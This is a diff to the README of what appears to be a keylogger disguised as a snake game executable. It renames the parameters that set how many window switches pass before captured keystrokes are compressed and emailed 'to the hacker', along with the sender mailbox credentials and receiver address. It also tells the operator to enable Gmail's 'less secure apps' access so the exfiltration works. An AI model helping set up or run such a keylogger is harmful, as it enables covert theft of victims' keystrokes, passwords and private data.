@@ -31,9 +31,9 @@
 4. `cd dist/ && ./snake.exe `
 
 **Modifiable parameters**  
-- `Packing_interval` 
+- `SEND_INTERVAL` 
   - How many the user does window switches are needed for the keylogger to compress all the information and send it to the hacker.  
-- `email_sender` & `email_password`
+- `E_ADDRESS` & `E_PASSWORD`
   - Mailboxes used to send packaged messages, If you use Google Mail, note that you must enable IMAP Access and "Control access to less secure apps" for your Gmial.
-- `receivers`
+- `RECEIVER`
   - Email address for receiving packaged information
